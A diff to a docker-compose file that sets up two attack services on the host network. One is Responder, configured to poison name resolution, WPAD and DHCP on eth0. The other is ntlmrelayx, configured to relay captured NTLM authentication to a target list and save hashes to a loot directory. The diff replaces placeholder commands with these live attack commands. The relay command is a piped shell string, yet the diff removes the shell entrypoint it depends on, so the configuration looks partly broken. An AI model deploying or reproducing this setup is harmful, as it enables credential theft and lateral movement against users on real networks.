@@ -1,5 +1,9 @@
 version: "3.8"
 
+# WARNING: This compose file is provided for reference only.
+# The production orchestrator uses docker-py directly and does NOT rely on compose.
+# Host network mode requires Linux.
+
 services:
   responder:
     build:
@@ -8,12 +12,9 @@ services:
     container_name: btc-relay-responder
     network_mode: host
     volumes:
-      - ../responder:/opt/responder
       - ../logs:/opt/responder/logs
     restart: unless-stopped
-    # Command is injected by the orchestrator dynamically
-    entrypoint: ["/bin/sh", "-c"]
-    command: ["tail -f /dev/null"]
+    command: ["-I", "eth0", "-v", "-w", "-D"]
 
   ntlmrelayx:
     build:
@@ -25,6 +26,4 @@ services:
       - ../loot:/loot
       - ../logs:/logs
     restart: unless-stopped
-    # Command is injected by the orchestrator dynamically via docker run override
-    entrypoint: ["/bin/sh", "-c"]
-    command: ["tail -f /dev/null"]
+    command: ["tail -f /dev/null | ntlmrelayx.py -tf /logs/targets.txt -ip 0.0.0.0 -smb2support --keep-relaying -of /loot/hashes -l /loot"]
